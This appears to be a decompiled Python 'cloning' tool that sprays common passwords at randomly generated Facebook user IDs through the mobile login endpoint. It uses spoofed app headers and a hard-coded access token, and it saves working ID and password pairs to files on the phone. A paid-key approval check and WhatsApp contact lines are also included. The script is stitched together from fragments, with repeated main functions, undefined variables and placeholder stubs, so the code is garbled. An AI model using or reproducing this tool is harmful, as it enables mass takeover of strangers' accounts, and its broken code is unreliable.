# GITHUB LINK : SKBER-CYBER
# DECODE BY : MUHAMMAD JAKARIYA HASAN
import os
import requests
import time
import sys
import random
import subprocess
import platform
import uuid
import base64
import hashlib
import zlib
import json
import re
import struct
import string
import concurrent.futures
from bs4 import BeautifulSoup
from concurrent.futures import ThreadPoolExecutor

# Constants
logo = '''
\x1b[1;32m╭───────────────────────────────────────────────────╮
\x1b[1;32m│   db   dD db   db  .d8b.  d8888b.  .d8b.  db      
\x1b[1;32m│   88 ,8P' 88   88 d8' `8b 88  `8D d8' `8b 88      
\x1b[1;32m│   88,8P   88ooo88 88ooo88 88oobY' 88ooo88 88      
\x1b[1;32m│   88`8b   88~~~88 88~~~88 88`8b   88~~~88 88      
\x1b[1;32m│   88 `88. 88   88 88   88 88 `88. 88   88 88booo.
\x1b[1;32m╰───────────────────────────────────────────────────╯
\x1b[1;34m OWNER \x1b[1;36m SARKAR  \x1b[1;39m DEVELOPER       
\x1b[1;32m╭────────────────────────────────╮
\x1b[1;32m│   Owner   :   ARYAN X HACKER
\x1b[1;32m│   Owner   :   KHARAL•MODS
\x1b[1;32m│   Status  :   FREE
\x1b[1;32m│   Github  :   KHARAL-404
\x1b[1;32m│   Version :  \x1b[1;34m  9.9
\x1b[1;32m╰────────────────────────────────╯
'''
def clear():
    os.system('clear')
    print(logo)

def print_line():
    print('\r\x1b[38;5;37m━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━')
def send_message(url):
    subprocess.run(f'xdg-open {url}', shell=True)
def get_user_agent():
    uas = [
        "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.124 Safari/537.36",
        "Mozilla/5.0 (Windows NT 6.1; WOW64; rv:59.0) Gecko/20100101 Firefox/59.0",
        "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_14_6) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/76.0.3809.100 Safari/537.36"
    ]
    return random.choice(uas)

def login():
    print("Logging in...")
    time.sleep(2)
    print("Login successful!")

def download(url):
    response = requests.get(url)
    with open("downloaded_file", 'wb') as file:
        file.write(response.content)
    print("File downloaded successfully.")

def process_data(data):
    try:
        decoded_data = base64.b64decode(data).decode('utf-8')
        print(f"Decoded Data: {decoded_data}")
    except Exception as e:
        print(f"Error in decoding data: {e}")

def fetch_html(url):
    headers = {
        "User-Agent": get_user_agent()
    }
    response = requests.get(url, headers=headers)
    soup = BeautifulSoup(response.text, 'html.parser')
    return soup

def execute_in_parallel(tasks):
    with ThreadPoolExecutor(max_workers=5) as executor:
        results = executor.map(lambda task: task(), tasks)
    return list(results)

def hash_data(data):
    return hashlib.sha256(data.encode()).hexdigest()
if __name__ == "__main__":
    clear()
    print_line()
    send_message("https://chat.whatsapp.com/Db23I52CPHA2fEMnPCk9Lp")
    login()
    download("https://example.com/file.zip")
    process_data("SGVsbG8gd29ybGQh")  # Base64 encoded "Hello world!"
    html_data = fetch_html("https://example.com")
    print(f"Fetched HTML data: {html_data}")
    tasks = [lambda: print("Task 1"), lambda: print("Task 2"), lambda: print("Task 3")]
    execute_in_parallel(tasks)
    hashed_data = hash_data("mysecretdata")
    print(f"Hashed data: {hashed_data}")

def clear():
    os.system('cls' if os.name == 'nt' else 'clear')

def loading_animation():
    animation = [
        '\x1b[1;91m■\x1b[0m□□□□□□□□□',
        '\x1b[1;92m■■\x1b[0m□□□□□□□□',
        '\x1b[1;93m■■■\x1b[0m□□□□□□□',
        '\x1b[1;94m■■■■\x1b[0m□□□□□□',
        '\x1b[1;95m■■■■■\x1b[0m□□□□□',
        '\x1b[1;96m■■■■■■\x1b[0m□□□□',
        '\x1b[1;97m■■■■■■■\x1b[0m□□□',
        '\x1b[1;98m■■■■■■■■\x1b[0m□□',
        '\x1b[1;99m■■■■■■■■■\x1b[0m□',
        '\x1b[1;910m■■■■■■■■■■\x1b[0m'
    ]    
    for i in range(30):
        time.sleep(0.1)
        sys.stdout.write('\r[' + animation[i % len(animation)] + '] LOADING...\x1b[97;1m ')
        sys.stdout.flush()    
    clear()
def display_options():
    print('\x1b[38;5;97m[\x1b[1;97m1\x1b[38;5;97m] \x1b[1;32m804-OLD CLONING \x1b[38;5;97m[\x1b[38;5;97m2009\x1b[38;5;97m/\x1b[38;5;97m2010\x1b[38;5;97m]\x1b[1;97m')
    print('\x1b[38;5;97m[\x1b[1;97m2\x1b[38;5;97m] \x1b[1;32m804-OLD CLONING \x1b[1;32mPAK-WORKING \x1b[38;5;97m[\x1b[38;5;97m2011\x1b[38;5;97m/\x1b[38;5;97m2012\x1b[38;5;97m]\x1b[1;97m')
    print('\x1b[38;5;97m[\x1b[1;97m3\x1b[38;5;97m] \x1b[1;32m804-OLD CLONING \x1b[1;32mPAK-WORKING\x1b[38;5;97m[\x1b[38;5;97m2009\x1b[38;5;97m/\x1b[38;5;97m2014\x1b[38;5;97m]\x1b[1;97m')
def get_user_selection():
    selection = input('\x1b[38;5;160m[\x1b[1;32m¤\x1b[38;5;160m] \x1b[1;32mSELECTION \x1b[38;5;160m▶ \x1b[1;32m')
    return selection
def main():
    clear()
    loading_animation()
    display_options()   
    selection = get_user_selection()    
    if selection in ['1', '01', '11', 'A', '১', '০১', 'a', 'A']:
        __Old1__()
    elif selection in ['2', '02', '22', 'b', 'B']:
        __Old2__()
    elif selection in ['3', '33', '03', 'c', 'C']:
        __Old3__()
    elif selection in ['4', '04', '44', 'D', 'd']:
        print("Invalid selection. Please try again.")
    else:
        print("Invalid selection. Please try again.")
from concurrent.futures import ThreadPoolExecutor
def clear():
    print("\033[H\033[J", end="")
def linex():
    print("-" * 50)
def __Old1__():
    clear()
    print("\x1b[38;5;160m[\x1b[1;97m¤\x1b[38;5;160m] \x1b[1;97mEXAMPLE \x1b[38;5;160m  ▶ \x1b[1;97m10000\x1b[38;5;97m|\x1b[1;97m20000\x1b[38;5;37m|\x1b[1;97m30000\x1b[38;5;37m|\x1b[1;97m40000")
    linex()    
    limit = int(input("\x1b[38;5;160m[\x1b[1;97m¤\x1b[38;5;160m] \x1b[1;97mSELECTION \x1b[38;5;160m▶ \x1b[1;97m"))
    year_code = '100000'    
    user = []
    for i in range(limit):
        data = str(random.choice(range(1000000000, 1999999999)))
        user.append(data)
    with ThreadPoolExecutor(max_workers=30) as executor:
        clear()
        print(f"\x1b[38;5;160m[\x1b[1;32m¤\x1b[38;5;160m] \x1b[1;32mTOTAL ID \x1b[38;5;160m▶ \x1b[1;32m{limit}")
        print("\x1b[38;5;160m[\x1b[1;32m¤\x1b[38;5;160m] \x1b[1;32mUSED AIRPLANE MODE AFTER 5 MINUTE ")
        linex()
        oks = []
        for mal in user:
            uid = str(int(year_code) + int(mal))
            executor.submit(submit, login1, uid)
        print("\r\x1b[38;5;160m[\x1b[1;97m¤\x1b[38;5;160m] \x1b[1;97mYOUR CRACKED HAS BEEN COMPLETED...\x1b[38;5;160m!")
        linex()
        print(f"\r\r\r\r\x1b[38;5;160m[\x1b[1;97m¤\x1b[38;5;160m] \x1b[1;97mTOTAL OK \x1b[38;5;160m▶ \x1b[38;5;46m{len(oks)}")
        linex()
        input("\x1b[38;5;160m[\x1b[1;97m¤\x1b[38;5;160m] \x1b[1;97mINTER TO BACK RAN AGAIN...\x1b[38;5;160m!\x1b[1;97m")        
def clear():
    print("\033[H\033[J", end="")
def linex():
    print("-" * 50)
def __Old2__():
    user = []
    clear()
    print("\033[38;5;160m[\033[1;97m¤\033[38;5;160m] \033[1;97mEXAMPLE \033[38;5;160m  ▶ \033[1;97m10000\033[38;5;32m|\033[1;97m20000\033[38;5;97m|\033[1;97m30000\033[38;5;97m|\033[1;97m40000")
    linex()   
    limit = input("\033[38;5;160m[\033[1;97m¤\033[38;5;160m] \033[1;97mSELECTION \033[38;5;160m▶ \033[1;97m")
    linex()    
    year_code = '10000'  
    for i in range(int(limit)):
        data = str(random.choice(range(1000000000, 1999999999)))
        user.append(data)   
    with ThreadPoolExecutor(max_workers=30) as executor:
        clear()
        print(f"\033[38;5;160m[\033[1;32m¤\033[38;5;160m] \033[1;32mTOTAL ID \033[38;5;160m▶ \033[1;32m{limit}")
        print("\033[38;5;160m[\033[1;32m¤\033[38;5;160m] \033[1;32mUSED AIRPLANE MODE AFTER 5 MINUTE ")
        linex()       
        for mal in user:
            uid = str(int(year_code) + int(mal))
            executor.submit(login2, uid)    
    print("\r\033[38;5;160m[\033[1;97m¤\033[38;5;160m] \033[1;97mYOUR CRACKED HAS BEEN COMPLETED...\033[38;5;160m!")
    linex()
    print(f"\r\r\r\r\033[38;5;160m[\033[1;97m¤\033[38;5;160m] \033[1;97mTOTAL OK \033[38;5;160m▶ \033[38;5;46m{len(user)}")
    linex()   
    input("\033[38;5;160m[\033[1;97m¤\033[38;5;160m] \033[1;97mINTER TO BACK RAN AGAIN...\033[38;5;160m!\033[1;97m")
    main()
def login2(uid):
    # Placeholder for the login function
    pass
import random
def clear():
    print("\033c", end="")
def linex():
    print("-" * 50)
def main():
    clear()
    print("\x1b[38;5;160m[\x1b[1;97m¤\x1b[38;5;160m] \x1b[1;97mEXAMPLE \x1b[38;5;160m  ▶\x1b[1;97m 10000\x1b[38;5;37m|\x1b[1;97m20000\x1b[38;5;37m|\x1b[1;97m30000\x1b[38;5;37m|\x1b[1;97m40000")
    linex()    
    limit = int(input("\x1b[38;5;160m[\x1b[1;97m¤\x1b[38;5;160m] \x1b[1;97mSELECTION \x1b[38;5;160m▶ \x1b[1;97m"))
    linex()
    year_code = '10000'
    user = []
    for i in range(limit):
        data = random.choice(range(1000000000, 1999999999))
        user.append(data)    
    clear()
    print(f'\x1b[38;5;160m[\x1b[1;97m¤\x1b[38;5;160m] \x1b[1;97mTOTAL ID \x1b[38;5;160m▶ \x1b[1;97m{limit}')
    print('\x1b[38;5;160m[\x1b[1;97m¤\x1b[38;5;160m] \x1b[1;97mUSED 1.1.1.1 VPN FOR BEST RESULT ')
    linex()
    jihad = []  # This is for the 'submit' operation
    for mal in user:
        uid = int(year_code) + mal
        jihad.append(uid)
        submit(uid)    
    clear()
    print('\r\x1b[38;5;160m[\x1b[1;97m¤\x1b[38;5;160m] \x1b[1;97mYOUR CRACKED HAS BEEN COMPLETED...\x1b[38;5;160m!')
    linex()
    print(f'\r\r\r\r\x1b[38;5;160m[\x1b[1;97m¤\x1b[38;5;160m] \x1b[1;97mTOTAL OK \x1b[38;5;160m▶ \x1b[38;5;46m{len(jihad)}')
    linex()    
    input("\x1b[38;5;160m[\x1b[1;97m¤\x1b[38;5;160m] \x1b[1;97mINTER TO BACK RAN AGAIN...\x1b[38;5;160m!\x1b[1;37m")
def submit(uid):
    # Placeholder for the login3 function
    login3(uid)
def login3(uid):
    print(f"Submitting user ID: {uid}")
import requests
import uuid
import json
import sys
import time
# Constants
URL = "https://b-graph.facebook.com/auth/login"
HEADERS = {
    'User-Agent': 'FBAN/FBAV/YZWSES93;FBBV/315210862;FBAN/FBAN;FBAV/YZWSES93;FBBV/315210862;FBDM//*{density=1.5,width=2560,height=3840};FBLC/it_IT;FBRV/117294473;FBCR/TECNO;FBMF/OnePlus;FBBD/Palm;FBPN/com.facebook.katana;FBDV/Vivo_Y93s;FBSV/13;FBOP/4;FBCA/x86;FBSS/10;',
    'Content-Type': 'application/x-www-form-urlencoded',
    'Host': 'graph.facebook.com',
    'X-FB-Net-HNI': '25227',
    'X-FB-SIM-HNI': '29752',
    'X-FB-Connection-Type': 'MOBILE.LTE',
    'X-Tigon-Is-Retry': 'False',
    'X-FB-Request-Analytics-Tags': 'graphservice',
    'X-FB-HTTP-Engine': 'Liger',
    'X-FB-Client-IP': 'True',
    'X-FB-Server-Cluster': 'x-fb-connection-token',
    'Content-Length': '706'
}
# Function to simulate login with Facebook credentials
def facebook_login(username, password):
    uid = str(uuid.uuid4())
    session = requests.Session()    
    data = {
        'email': username,
        'password': password,
        'locale': 'en_US',
        'client_country_code': 'US',
        'auth.login': 'authenticate',
        'access_token': '350685531728|62f8ce9f74b12f84c123cc23437a4a32',
        'generate_session_cookies': '1',
        'error_detail_type': 'button_with_disabled',
    }
    try:
        response = session.post(URL, headers=HEADERS, data=data, timeout=10)
        
        if response.status_code == 200:
            response_data = response.json()
            if response_data.get('error'):
                print(f"Error: {response_data['error']['message']}")
            else:
                print(f"Login Successful! Session ID: {response_data.get('session_key')}")
        else:
            print(f"Failed to login. Status code: {response.status_code}")
    except requests.exceptions.RequestException as e:
        print(f"Request failed: {e}")
        sys.exit(1)

# Example usage
if __name__ == "__main__":
    username = input("Enter your email: ")
    password = input("Enter your password: ")
    facebook_login(username, password)
    time.sleep(2)
import requests
import sys
import uuid
import time

def main():
    loop = 0
    oks = []
    cps = []
    ua = 'FBAN/;FBAV/YZWSES93;FBBV/315210862;FBAN/FBAN;FBAV/YZWSES93;FBBV/315210862;FBDM//*{density=1.5,width=2560,height=3840};FBLC/it_IT;FBRV/117294473;FBCR/TECNO;FBMF/OnePlus;FBBD/Palm;FBPN/com.facebook.katana;FBDV/Vivo_Y93s;FBSV/13;FBOP/4;FBCA/x86;FBSS/10;'
    passwords = ('123456', '1234567', '12345678', '123456789', '111222', '112233', '786786')

    while True:
        for pw in passwords:
            data = {
                'adid': str(uuid.uuid4()),
                'format': 'json',
                'device_id': str(uuid.uuid4()),
                'cpl': 'true',
                'family_device_id': str(uuid.uuid4()),
                'credentials_type': 'device_based_login_password',
                'error_detail_type': 'button_with_disabled',
                'source': 'device_based_login',
                'email': uid,
                'password': pw,
                'access_token': '350685531728|62f8ce9f74b12f84c123cc23437a4a32',
                'generate_session_cookies': '1',
                'meta_inf_fbmeta': '',
                'advertiser_id': str(uuid.uuid4()),
                'currently_logged_in_userid': '0',
                'locale': 'en_US',
                'client_country_code': 'US',
                'auth.login': 'authenticate',
                'fb_api_req_friendly_name': 'auth.login',
                'fb_api_caller_class': 'com.facebook.account.login.protocol.Fb4aAuthHandler',
                'api_key': '882a8490361da98702bf97a021ddc14d'
            }

            headers = {
                'User-Agent': ua,
                'Content-Type': 'application/x-www-form-urlencoded',
                'Host': 'graph.facebook.com',
                'X-FB-Net-HNI': '25227',
                'X-FB-SIM-HNI': '29752',
                'X-FB-Connection-Type': 'MOBILE.LTE',
                'X-Tigon-Is-Retry': 'False',
                'x-fb-session-id': 'nid=jiZ+yNNBgbwC;pid=Main;tid=132;nc=1;fc=0;bc=0;cid=d29d67d37eca387482a8a5b740f84f62',
                'x-fb-device-group': '5120',
                'X-FB-Friendly-Name': 'ViewerReactionsMutation',
                'X-FB-Request-Analytics-Tags': 'graphservice',
                'X-FB-HTTP-Engine': 'Liger',
                'X-FB-Client-IP': 'True',
                'X-FB-Server-Cluster': 'True',
                'x-fb-connection-token': 'd29d67d37eca387482a8a5b740f84f62',
                'Content-Length': '706'
            }

            url = 'https://b-graph.facebook.com/auth/login'
            response = requests.post(url, data=data, headers=headers)

            rp = response.json()
            if 'session_key' in rp:
                print(f'\r\r\r\r\r\x1b[38;5;37m[\x1b[38;5;46m804\x1b[1;97m-\x1b[38;5;46mOK\x1b[38;5;37m] \x1b[38;5;46m{uid} \x1b[1;97m● \x1b[38;5;46m{pw}\x1b[1;97m')
                with open('/sdcard/804-M1-OLD-OK.txt', 'a') as f:
                    f.write(f'{uid}|{pw}\n')
                oks.append(uid)
            elif 'www.facebook.com' in rp.get('error', {}).get('message', ''):
                print(f'\r\r\r\r\r\x1b[38;5;37m[\x1b[38;5;46m804\x1b[1;97m-\x1b[38;5;46mOK\x1b[38;5;37m] \x1b[38;5;46m{uid} \x1b[1;97m● \x1b[38;5;46m{pw}\x1b[1;97m')
                with open('/sdcard/804-M1-OLD-OK.txt', 'a') as f:
                    f.write(f'{uid}|{pw}\n')
                cps.append(uid)

        loop += 1
        time.sleep(30)
        
def facebook_login():
    url = "https://b-graph.facebook.com/auth/login"
    headers = {
        'User-Agent': 'FB4A/;FBAV/4Q095MQG;FBBV/945381475;FBAN/FB4A;FBAV/4Q095MQG;FBAV/4Q095MQG;',
        'Content-Type': 'application/x-www-form-urlencoded',
        'Host': 'graph.facebook.com',
        'X-FB-Net-HNI': '25227',
        'X-FB-SIM-HNI': '29752',
        'X-FB-Connection-Type': 'MOBILE.LTE',
        'X-Tigon-Is-Retry': 'False',
        'x-fb-session-id': 'nid=jiZ+yNNBgbwC;pid=Main;tid=132;nc=1;fc=0;bc=0;cid=d29d67d37eca387482a8a5b740f84f62',
        'x-fb-device-group': '5120',
        'X-FB-Friendly-Name': 'ViewerReactionsMutation',
        'X-FB-Request-Analytics-Tags': 'graphservice',
        'X-FB-HTTP-Engine': 'Liger',
        'X-FB-Client-IP': 'True',
        'X-FB-Server-Cluster': 'x-fb-connection-token',
        'Content-Length': '706'
    }

    data = {
        'email': 'user@example.com',
        'password': 'password123',
        'device_id': str(uuid.uuid4()),  # Generate a unique device ID
        'credentials_type': 'device_based_login_password',
        'locale': 'en_US',
        'client_country_code': 'US',
        'auth.login': 'authenticate',
        'source': 'device_based_login',
        'generate_session_cookies': '1'
    }

    try:
        response = requests.post(url, headers=headers, data=data)
        response.raise_for_status()  # Raise an exception for HTTP errors

        if response.status_code == 200:
            print(f"Login successful! Session: {response.text}")
            with open("/sdcard/804-M2-OLD-OK.txt", "a") as file:
                file.write(f"{response.text}\n")
        else:
            print(f"Error during login: {response.status_code}")
            print(response.text)
    except requests.exceptions.RequestException as e:
        print(f"Request failed: {e}")

import requests
import sys
import uuid
import time

# Initialize session and set user agent
session = requests.Session()
sys.stdout.write('\r\r\x1b[38;5;46m[\x1b[38;5;46m804\x1b[38;5;46m-\x1b[38;5;46mM2\x1b[38;5;46m]\x1b[1;32m-\x1b[38;5;46m[\x1b[1;32m')
loop = 0

# Initialize lists to store successful and failed login attempts
oks = []
cps = []

# User-Agent and URL for the login request
ua = '[FB4A/;FBAV/4Q095MQG;FBBV/945381475;FBAN/FB4A;FBAV/4Q095MQG;FBBV/945381475;FBDM//*{density=2.0,width=2560,height=2560};FBLC/zh_CN;FBRV/662629853;FBCR/OPPO;FBMF/Motorola;FBBD/Asus;FBPN/com.facebook.katana;FBDV/Xiaomi_Mi_Mix_6;FBSV/13;FBOP/7;FBCA/armeabi;FBSS/10;]'
passwords = ('112233', '123456', '1234567', '12345678', '123456789', '111222')
url = 'https://b-graph.facebook.com/auth/login'
for pw in passwords:
    data = {
        'adid': str(uuid.uuid4()),
        'format': 'json',
        'device_id': str(uuid.uuid4()),
        'cpl': 'true',
        'family_device_id': str(uuid.uuid4()),
        'credentials_type': 'device_based_login_password',
        'error_detail_type': 'button_with_disabled',
        'source': 'device_based_login',
        'email': 'user@example.com',  # Replace with real email
        'password': pw,
        'access_token': '350685531728|62f8ce9f74b12f84c123cc23437a4a32',
        'generate_session_cookies': '1',
        'meta_inf_fbmeta': '',
        'advertiser_id': str(uuid.uuid4()),
        'currently_logged_in_userid': '0',
        'locale': 'en_US',
        'client_country_code': 'US',
        'auth.login': 'authenticate',
        'fb_api_req_friendly_name': 'fb_api_req_friendly_name',
        'fb_api_caller_class': 'api_key'
    }
    
    headers = {
        'User-Agent': ua,
        'Content-Type': 'application/x-www-form-urlencoded',
        'Host': 'graph.facebook.com',
        'X-FB-Net-HNI': '25227',
        'X-FB-SIM-HNI': '29752',
        'X-FB-Connection-Type': 'MOBILE.LTE',
        'X-Tigon-Is-Retry': 'False',
        'x-fb-session-id': 'nid=jiZ+yNNBgbwC;pid=Main;tid=132;nc=1;fc=0;bc=0;cid=d29d67d37eca387482a8a5b740f84f62',
        'x-fb-device-group': '5120',
        'X-FB-Friendly-Name': 'ViewerReactionsMutation',
        'X-FB-Request-Analytics-Tags': 'graphservice',
        'X-FB-HTTP-Engine': 'Liger',
        'X-FB-Client-IP': 'True',
        'X-FB-Server-Cluster': 'True',
        'x-fb-connection-token': 'd29d67d37eca387482a8a5b740f84f62',
        'Content-Length': '706'
    }
    
    try:
        response = session.post(url, data=data, headers=headers, allow_redirects=False, verify=True)
        rp = response.json()     
        if 'session_key' in rp:
            print(f'\r\r\r\r\r\x1b[38;5;37m[\x1b[38;5;46m804\x1b[1;97m-\x1b[38;5;46mOK\x1b[38;5;37m] \x1b[38;5;46m{uid} ● \x1b[38;5;46m{pw}')
            with open('/sdcard/804-M2-OLD-OK.txt', 'a') as f:
                f.write(f'{uid}|{pw}\n')
            oks.append(uid)
        elif 'error' in rp.get('error', {}).get('message', ''):
            print(f'\r\r\r\r\r\x1b[38;5;37m[\x1b[38;5;46m804\x1b[1;97m-\x1b[38;5;46mOK\x1b[38;5;37m] \x1b[38;5;46m{uid} ● \x1b[38;5;46m{pw}')
            with open('/sdcard/804-M2-OLD-OK.txt', 'a') as f:
                f.write(f'{uid}|{pw}\n')
            cps.append(uid)        
        time.sleep(30)  # Sleep to prevent overwhelming requests
    except Exception as e:
        print(f"Error: {e}")
        time.sleep(30)

def login3(uid):
    session = requests.Session()
    url = 'https://b-graph.facebook.com/auth/login'
    headers = {
        'User-Agent': 'FB4A/;FBAV/A1XDL5U4;FBBV/383268880;FBAN/FB4A;FBAV/A1XDL5U4;FBBD/Google;FBPN/com.facebook.katana;FBDV/LG_Q13;FBSV/17;FBOP/8;FBCA/arm64-v8a;FBSS/19;',
        'Content-Type': 'application/x-www-form-urlencoded',
        'Host': 'graph.facebook.com',
        'X-FB-Net-HNI': '25227',
        'X-FB-SIM-HNI': '29752',
        'X-FB-Connection-Type': 'MOBILE.LTE',
        'X-FB-Friendly-Name': 'ViewerReactionsMutation',
        'X-FB-Request-Analytics-Tags': 'graphservice',
        'X-FB-HTTP-Engine': 'Liger',
        'X-FB-Client-IP': 'True',
        'X-FB-Server-Cluster': 'x-fb-connection-token',
    }

    passwords = [
        '123456', '1234567', '12345678', '123456789', '111222'
    ]

    for pw in passwords:
        data = {
            'email': uid,
            'password': pw,
            'device_id': str(uuid.uuid4()),
            'credentials_type': 'device_based_login_password',
            'source': 'device_based_login',
            'access_token': '350685531728|62f8ce9f74b12f84c123cc23437a4a32',
            'locale': 'en_US',
            'client_country_code': 'US',
        }

        try:
            response = session.post(url, headers=headers, data=data)
            response_json = response.json()

            if 'session_key' in response_json:
                print(f'\r\r\x1b[38;5;37m[\x1b[38;5;46m804\x1b[1;97m-\x1b[38;5;46mOK\x1b[38;5;37m] \x1b[38;5;46m{uid} | {pw}')
                with open('/sdcard/804-M4-OLD-OK.txt', 'a') as f:
                    f.write(f'{uid} | {pw}\n')
                break
            else:
                print(f'Failed login attempt for {uid} with password {pw}')
        except Exception as e:
            print(f'An error occurred: {e}')
            time.sleep(1)

def main():
    session = requests.Session()
    print('\r\r\x1b[38;5;46m[\x1b[38;5;46m804\x1b[38;5;46m-\x1b[38;5;46mM3\x1b[38;5;46m]\x1b[1;32m-\x1b[38;5;46m[\x1b[1;32m', end='')    
    loop = 0
    oks = []
    cps = []
    ua = 'FB4A/;FBAV/A1XDL5U4;FBBV/383268880;FBAN/FB4A;FBAV/A1XDL5U4;FBBV/383268880;FBDM//*{density=1.5,width=1920,height=4096};FBLC/ja_JP;FBRV/750710792;FBCR/Realme;FBMF/VIVO;FBBD/Google;FBPN/com.facebook.katana;FBDV/LG_Q13;FBSV/17;FBOP/8;FBCA/arm64-v8a;FBSS/19;'
    for pw in ('123456', '1234567', '12345678', '123456789', '111222'):
        data = {
            'adid': str(uuid.uuid4()),
            'format': 'json',
            'device_id': str(uuid.uuid4()),
            'cpl': 'true',
            'family_device_id': str(uuid.uuid4()),
            'credentials_type': 'device_based_login_password',
            'error_detail_type': 'button_with_disabled',
            'source': 'device_based_login',
            'email': uid,
            'password': pw,
            'access_token': '350685531728|62f8ce9f74b12f84c123cc23437a4a32',
            'generate_session_cookies': '1',
            'meta_inf_fbmeta': '',
            'advertiser_id': str(uuid.uuid4()),
            'currently_logged_in_userid': '0',
            'locale': 'en_US',
            'client_country_code': 'US',
            'auth.login': 'authenticate',
            'fb_api_req_friendly_name': 'authenticate',
            'fb_api_caller_class': 'com.facebook.account.login.protocol.Fb4aAuthHandler',
            'api_key': '882a8490361da98702bf97a021ddc14d'
        }

        headers = {
            'User-Agent': ua,
            'Content-Type': 'application/x-www-form-urlencoded',
            'Host': 'graph.facebook.com',
            'X-FB-Net-HNI': '25227',
            'X-FB-SIM-HNI': '29752',
            'X-FB-Connection-Type': 'MOBILE.LTE',
            'X-Tigon-Is-Retry': 'False',
            'x-fb-session-id': 'nid=jiZ+yNNBgbwC;pid=Main;tid=132;nc=1;fc=0;bc=0;cid=d29d67d37eca387482a8a5b740f84f62',
            'x-fb-device-group': '5120',
            'X-FB-Friendly-Name': 'ViewerReactionsMutation',
            'X-FB-Request-Analytics-Tags': 'graphservice',
            'X-FB-HTTP-Engine': 'Liger',
            'X-FB-Client-IP': 'True',
            'X-FB-Server-Cluster': 'True',
            'x-fb-connection-token': 'd29d67d37eca387482a8a5b740f84f62',
            'Content-Length': '706'
        }
        url = 'https://b-graph.facebook.com/auth/login'
        rp = requests.post(url, data=data, headers=headers).json()
        if 'session_key' in rp:
            print(f'\r\r\r\r\r\x1b[38;5;37m[\x1b[38;5;46m804\x1b[1;97m-\x1b[38;5;46mOK\x1b[38;5;37m] \x1b[38;5;46m{uid} \x1b[1;97m● \x1b[38;5;46m{pw}\x1b[1;97m')
            with open('/sdcard/804-M4-OLD-OK.txt', 'a') as f:
                f.write(f'{uid}|{pw}\n')
            oks.append(uid)
        elif 'www.facebook.com' in rp.get('error', {}).get('message', ''):
            print(f'\r\r\r\r\r\x1b[38;5;37m[\x1b[38;5;46m804\x1b[1;97m-\x1b[38;5;46mOK\x1b[38;5;37m] \x1b[38;5;46m{uid} \x1b[1;97m● \x1b[38;5;46m{pw}\x1b[1;97m')
            with open('/sdcard/804-M4-OLD-OK.txt', 'a') as f:
                f.write(f'{uid}|{pw}\n')
            cps.append(uid)
        loop += 1
    time.sleep(30)
def logo():
    print("\x1b[1;32m╭───────────────────────────────────────────────────╮")
    print("\x1b[1;32m│   db   dD db   db  .d8b.  d8888b.  .d8b.  db      ")
    print("\x1b[1;32m│   88 ,8P' 88   88 d8' `8b 88  `8D d8' `8b 88      ")
    print("\x1b[1;32m│   88,8P   88ooo88 88ooo88 88oobY' 88ooo88 88      ")
    print("\x1b[1;32m│   88`8b   88~~~88 88~~~88 88`8b   88~~~88 88      ")
    print("\x1b[1;32m│   88 `88. 88   88 88   88 88 `88. 88   88 88booo.")
    print("\x1b[1;32m╰───────────────────────────────────────────────────╯")
    print("\x1b[1;34m OWNER \x1b[1;36m SARKAR  \x1b[1;39m DEVELOPER       ")
    print("\x1b[1;32m╭────────────────────────────────╮")
    print("\x1b[1;32m│   Owner   :   ARYAN X HACKER")
    print("\x1b[1;32m│   Owner   :   KHARAL•MODS")
    print("\x1b[1;32m│   Status  :   FREE")
    print("\x1b[1;32m│   Github  :   KHARAL-404")
    print("\x1b[1;32m│   Version :  \x1b[1;34m  9.9")
    print("\x1b[1;32m╰────────────────────────────────╯")
def meyexudi():
    os.system('clear')
    logo()    
    uuid = str(os.getuid()) + 'MODS' + str(os.getuid()) + 'FREE.TOOL'
    id = os.path.join(uuid)  
    response = requests.get('https://github.com/technicalarslan22/Server-Ali/blob/main/Approval.txt')
    httpCaht = response.text    
    if id in httpCaht:
        msg = str(os.geteuid())
        print(msg)
        return
    print(' \x1b[1;32m╭────────────────────────────────╮')
    print(' \x1b[1;32m║══[𝟷]Your Key : ' + id)
    print(' \x1b[1;32m║══[•]  FREE-FIRE-TIK-TOK- ID CLONING')
    print(' \x1b[1;32m║══[•]  ONLY ACTIVE ID CLONE 100%')
    print(' \x1b[1;32m║══[•]  CP ID WILL BE LOGIN 80%')
    print(' \x1b[1;32m║══[•]  WI-FI  AND DATA BOTH WORKING 100%')
    print(' \x1b[1;32m║══[•]  5 DAY 100 RS ')
    print(' \x1b[1;32m║══[•]  15 DAY 300 Rs ')
    print(' \x1b[1;32m║══[•]  30 DAY 800 Rs ')
    print(' \x1b[1;32m║══[KEY]: ' + id)
    print(' \x1b[1;32m╰────────────────────────────────╯')
    uname = input('\x1b[1;97m[\x1b[1;92m•\x1b[1;97m]\x1b[1;92m WHAT IS YOUR NAME \x1b[1;91m: \x1b[1;32m')
    input(' \x1b[1;30m╚══[•] IF U WANT APPROVAL THEN PRESS ENTER ')  
    tks = 'Hello%20Sir%20!%20Please%20Approve%20My%20Token%20The%20Token%20Is%20:' + id
    os.system('am start https://wa.me/+923292359952?text=' + tks)
if __name__ == "__main__":
    meyexudi()
